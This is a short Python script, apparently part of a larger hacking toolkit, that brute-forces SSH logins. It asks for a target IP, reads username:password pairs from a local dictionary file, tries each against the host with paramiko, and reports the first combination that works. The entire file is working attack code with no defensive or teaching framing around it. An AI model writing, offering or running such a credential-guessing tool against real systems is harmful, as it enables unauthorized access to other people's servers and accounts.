import paramiko
import signal

def ssh_brute():
	ip_target=raw_input("ssh>Enter the host IP:")
	ssh_instance=paramiko.SSHClient()
	ssh_instance.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	dictionary=open("./password_lists/ssh_dict.txt","r")
	for line in dictionary.readlines():
		(username,password)=line.strip().split(":")
		try:
			ssh_instance.connect(ip_target,username=username,password=password)
		
		except KeyboardInterrupt:
			print("Quitting")
			return

		except:
			print('\x1b[0;30;41m'"[!]Incorrect Username and Password combination(%s,%s)" %(username,password)+'\x1b[0m')
	
		else:
			print('\x1b[0;30;42m'+"[+]Correct Username adn Password combination(%s,%s)" %(username,password)+'\x1b[0m')
			break
		

	ssh_instance.close()

